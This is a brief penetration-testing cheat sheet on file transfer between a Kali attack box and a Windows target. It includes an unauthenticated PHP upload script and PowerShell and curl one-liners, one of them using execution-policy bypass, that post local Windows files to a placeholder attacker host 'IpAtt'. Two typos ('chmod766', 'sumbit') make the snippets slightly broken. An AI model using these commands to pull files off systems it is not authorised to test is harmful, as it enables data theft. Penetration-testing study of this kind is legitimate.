# File transfer

## Download

source: https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65

```
python -m http.server 8080

mv somefile /var/www/html
systemctl start apache2
```

## Upload

source: https://infosecwriteups.com/tip-uploading-files-from-windows-to-kali-using-php-63aadde872a9

### Php on Kali

```
vim upload.php

<?php
  $target_dir = "uploads/";
  $target_file = $target_dir . basename($_FILES["targetfile"]["name"]);
  move_uploaded_file($_FILES["targetfile"]["tmp_name"], $target_file)
?>

mv upload.php /var/www/html

mkdir /var/www/html/uploads
chown www-data.www-data /var/www/html/uploads
chmod766 /var/www/html/uploads

systemctl start apache2
```

### On Windows

```
powershell -nop -exec bypass Invoke-RestMethod -Uri http://IpAtt/upload.php -Method Post -Infile 'c:\path\to\file.txt'

curl -H Content-Type:"multipart/form-data" --form targetfile=@"c:\path\to\file.txt" -X Post -v http://IpAtt/upload.php
```

### Http on Kali

```
vim upload.html

<html>
  <head></head>
  <body>
    <form action="http://IpAtt/upload.php" method="POST" enctype="multipart/form-data">
      <br><br>
      Choose a file: <br>
      <input type="file" name="targetfile"><br>
      <input type="sumbit" name="submit" value="upload">
    </form>
  </body>
</html>
```
To upload on a browser


